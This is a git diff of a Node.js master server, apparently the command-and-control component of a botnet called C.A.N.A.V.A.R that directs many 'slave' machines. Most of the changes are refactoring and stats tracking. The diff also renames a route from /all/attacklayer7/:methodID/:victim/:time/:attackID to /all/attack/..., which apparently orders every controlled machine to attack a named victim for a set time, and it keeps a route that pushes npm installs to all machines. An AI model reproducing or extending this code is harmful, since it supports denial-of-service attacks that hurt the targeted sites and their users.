@@ -88,11 +88,16 @@ let database = {
     scripts: "http://localhost:3000/scripts/",
     machines: "http://localhost:3000/machines/",
     settings: "http://localhost:3000/settings/",
+    stats: "http://localhost:3000/stats/",
 }
 
 let slaveInfo = {
     scripts: null,
     setup: null
+}
+
+let stats = {
+    
 }
 
 let Machines = {
@@ -131,12 +136,6 @@ si.getDynamicData(function (data) {
 })
 
 let initiated = true
-let AGENTLINK = null
-let SERVICELINK = null
-let SERVICENAME = null
-let SCRIPTS = null
-let activeMachinesList = []
-let activemachinesindb = []
 
 const databaseInitiated = new EventEmitter()
 
@@ -205,34 +204,76 @@ jServer.listen(3000, () => { console.log("dbok"); databaseInitiated.emit('true')
 
 databaseInitiated.on('true', async () => {
     console.log("Begin init.");
-    await fetchGlobals()
-    await fetchConfig()
-    await fetchSlaveSetup()
-    await fetchScripts()
+    await fetch.globals()
+    await fetch.config()
+    await fetch.slaveSetup()
+    await fetch.scripts()
+    await fetch.stats()
     updateMasterSubdomain()
     await dbMachineCleanup()
     console.log("End init.");
 })
 
-async function fetchConfig() {
-    return axios.get(database.settings)
-        .then(resx => {
-            config = resx.data
-        })
-        .catch(err => {
-
-        })
-}
-
-async function fetchGlobals() {
-    return axios.get(database.globals, { timeout: 4000 })
+let fetch = {
+    globals: async function(){
+        return axios.get(database.globals, { timeout: 4000 })
         .then(res => {
             Globals = res.data
         })
         .catch(err => {
-            fetchGlobals()
+            fetch.globals()
         })
+    },
+    config: async function() {
+        return axios.get(database.settings)
+        .then(resx => {
+            config = resx.data
+        })
+        .catch(err => {
+            fetch.config()
+        })
+    },
+    slaveSetup: async function() {
+        return axios.get(database.setup)
+        .then(res => {
+            slaveInfo.setup = res.data
+            for (const key in slaveInfo.setup) {
+                let k = key
+                let aa = (stitchSetupLines(k, (slaveInfo.setup)))
+                if (aa) {
+                    ((slaveInfo.setup)[k]) = aa
+                }
+            }
+            console.log("Setups loaded.");
+        })
+        .catch(err => {
+            console.error(err);
+        })
+    },
+    scripts: async function() {
+        return axios.get(database.scripts)
+        .then(res => {
+            slaveInfo.scripts = res.data
+            console.log("Scripts loaded.");
+        })
+        .catch(err => {
+            console.error(err);
+        })
+    },
+    stats: async function() {
+        return axios.get(database.stats)
+        .then(res => {
+            stats = res.data
+            console.log("Scripts loaded.");
+        })
+        .catch(err => {
+            console.error(err);
+        })
+    }
 }
+
+
+
 
 async function dbMachineCleanup() {
     return axios.get(database.machines)
@@ -258,40 +299,22 @@ async function dbMachineCleanup() {
         })
 }
 
-async function fetchSlaveSetup() {
-    return axios.get(database.setup)
-        .then(res => {
-            slaveInfo.setup = res.data
-            for (const key in slaveInfo.setup) {
-                let k = key
-                let aa = (stitchSetupLines(k, (slaveInfo.setup)))
-                if (aa) {
-                    ((slaveInfo.setup)[k]) = aa
-                }
-            }
-            console.log("Setups loaded.");
-        })
-        .catch(err => {
-            console.error(err);
-        })
-}
-
-async function fetchScripts() {
-    return axios.get(database.scripts)
-        .then(res => {
-            slaveInfo.scripts = res.data
-            console.log("Scripts loaded.");
-        })
-        .catch(err => {
-            console.error(err);
-        })
-}
 
 async function dumpGlobals() {
     return axios.patch(database.globals, Globals)
         .then(res => {
             Globals.latestGlobalsDump = Date.now()
             console.log("Globals dumped.");
+        })
+        .catch(err => {
+            console.error(err);
+        })
+}
+
+async function dumpStats() {
+    return axios.patch(database.stats, stats)
+        .then(res => {
+            console.log("Stats dumped.");
         })
         .catch(err => {
             console.error(err);
@@ -480,7 +503,7 @@ app.get('/all/npminstall/:module', async (req, res) => {
     res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 
-app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
+app.get('/all/attack/:methodID/:victim/:time/:attackID', async (req, res) => {
     let machines = {
         all: Machines.list(),
         asked: [],
@@ -533,6 +556,9 @@ app.get('/machines/list', (req, res) => {
     let macar = []
     for (const key in Machines.all) { macar.push(Machines.all[key]) }
     res.send(200, macar)
+})
+app.get('/machines/count', (req, res) => {
+    res.send(200, Machines.count())
 })
 app.get('/machines/:machid', (req, res) => {
     res.send(200, Machines.get([req.params.machid]))
@@ -589,7 +615,7 @@ app.get('/mgmt/systemInfo', async (req, res) => {
 
 app.post('/mgmt/update', (req, res) => {
     res.send(200)
-    exec("cd /C.A.N.A.V.A.R/ ; git pull; cd master ; npm install; nohup systemctl restart canavarmaster &", (err, stdout, stderr) => {
+    exec("cd /C.A.N.A.V.A.R/ ; git stash; git stash drop; git pull; cd master ; npm install; pm2 restart 0", (err, stdout, stderr) => {
         if (err) {
             //some err occurred
             console.error(err)
